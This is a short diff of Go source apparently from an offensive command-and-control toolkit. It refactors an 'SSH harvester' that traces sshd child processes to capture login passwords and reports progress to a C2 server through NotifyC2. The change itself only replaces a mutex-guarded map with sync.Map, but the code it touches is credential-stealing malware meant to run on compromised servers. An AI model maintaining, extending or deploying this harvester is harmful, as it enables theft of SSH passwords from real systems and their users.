@@ -26,8 +26,7 @@ var (
 	SshHarvesterRunning bool
 
 	// record traced sshd sessions
-	traced_pids     = make(map[int]bool)
-	traced_pids_mut = &sync.RWMutex{}
+	traced_pids = sync.Map{}
 
 	// provide a way to stop the harvester
 	SshHarvesterCtx    context.Context
@@ -69,11 +68,9 @@ func SshHarvester(cmd *cobra.Command, code_pattern []byte, reg_name string) (err
 			for _, child := range children_pids {
 				child_pid, err := strconv.Atoi(child)
 				if err == nil {
-					traced_pids_mut.RLock()
-					if !traced_pids[child_pid] {
+					if _, ok := traced_pids.Load(child_pid); !ok {
 						go sshd_harvester(child_pid, cmd, code_pattern, reg_name)
 					}
-					traced_pids_mut.RUnlock()
 				}
 			}
 		}
@@ -95,9 +92,7 @@ func sshd_harvester(pid int, cmd *cobra.Command, code_pattern []byte, reg_name s
 	defer c2transport.NotifyC2(cmd, "SSH harvester for sshd session %d done", pid)
 
 	// remember pid
-	traced_pids_mut.Lock()
-	traced_pids[pid] = true
-	traced_pids_mut.Unlock()
+	traced_pids.Store(pid, true)
 
 	// passwords
 	passwords := make([]string, 1)
